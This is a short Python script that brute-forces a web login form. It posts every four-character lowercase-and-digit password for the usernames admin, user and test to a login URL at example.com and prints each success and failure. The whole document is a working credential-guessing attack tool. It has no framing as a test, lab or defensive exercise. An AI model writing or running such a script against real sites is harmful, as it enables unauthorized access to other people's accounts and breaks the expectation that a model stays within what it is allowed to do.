import requests
from itertools import product
import string

url = 'http://example.com/login'
usernames = ['admin', 'user', 'test']
charset = string.ascii_lowercase + string.digits

# Function to attempt login
def attempt_login(username, password):
    payload = {'username': username, 'password': password}
    response = requests.post(url, data=payload)
    return response.status_code == 200

# Generate password combinations
for username in usernames:
    for password in product(charset, repeat=4):  # Adjust the repeat value as needed
        password = ''.join(password)
        if attempt_login(username, password):
            print(f'Success! Username: {username}, Password: {password}')
            break
        else:
            print(f'Failed attempt: Username: {username}, Password: {password}')